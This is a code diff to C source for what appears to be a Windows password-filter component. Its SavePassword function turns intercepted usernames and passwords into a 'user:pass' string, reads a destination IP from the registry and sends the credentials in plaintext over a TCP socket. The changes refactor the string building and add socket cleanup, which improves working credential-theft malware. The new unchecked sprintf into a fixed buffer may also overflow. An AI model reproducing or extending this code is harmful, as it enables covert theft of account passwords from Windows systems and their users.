@@ -91,7 +91,6 @@ char* getIPReg()
 		0,
 		KEY_QUERY_VALUE | KEY_WOW64_32KEY,
 		&hKey) == ERROR_SUCCESS)
-
 	{
 		DWORD error = RegQueryValueEx(hKey,
 			L"ipa",
@@ -141,10 +140,7 @@ int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 	wcstombs(user, username->Buffer, sizeof(user));
 	wcstombs(pass, password->Buffer, sizeof(pass));
 
-	strcat(pass, ";end");
-	strcat(creds, user);
-	strcat(creds, ":");
-	strcat(creds, pass);
+	sprintf(creds, "%s:%s;end", user, pass);
 
 	printf("\nInitialising Winsock...");
 	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
@@ -159,6 +155,8 @@ int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
 	{
 		printf("Could not create socket : %d", WSAGetLastError());
+		WSACleanup();
+		return 1;
 	}
 
 	printf("Socket created.\n");
@@ -171,6 +169,7 @@ int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 	if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0)
 	{
 		puts("connect error");
+		WSACleanup();
 		return 1;
 	}
 
@@ -180,9 +179,12 @@ int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 	if (send(s, creds, strlen(creds), 0) < 0)
 	{
 		puts("Send failed");
+		WSACleanup();
 		return 1;
 	}
 	puts("Data Send\n");
+
+	WSACleanup();
 
 	return 0;
 }
